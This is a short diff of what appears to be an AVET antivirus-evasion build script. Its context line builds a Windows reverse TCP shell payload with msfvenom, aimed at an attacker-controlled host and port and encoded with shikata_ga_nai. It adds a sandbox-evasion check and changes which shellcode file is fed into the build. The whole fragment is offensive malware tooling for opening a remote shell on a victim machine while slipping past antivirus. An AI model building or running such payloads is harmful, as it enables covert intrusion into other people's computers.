@@ -27,7 +27,7 @@ msfvenom -p windows/shell/reverse_tcp lhost=$LHOST lport=$LPORT -e x86/shikata_g
 add_evasion fopen_sandbox_evasion
 
 # set shellcode source
-set_shellcode_source static_from_file input/scclean.txt
+ set_shellcode_source static_from_file input/sc.txt
 
 # set decoder and key source
 # AVET decoder requires no key
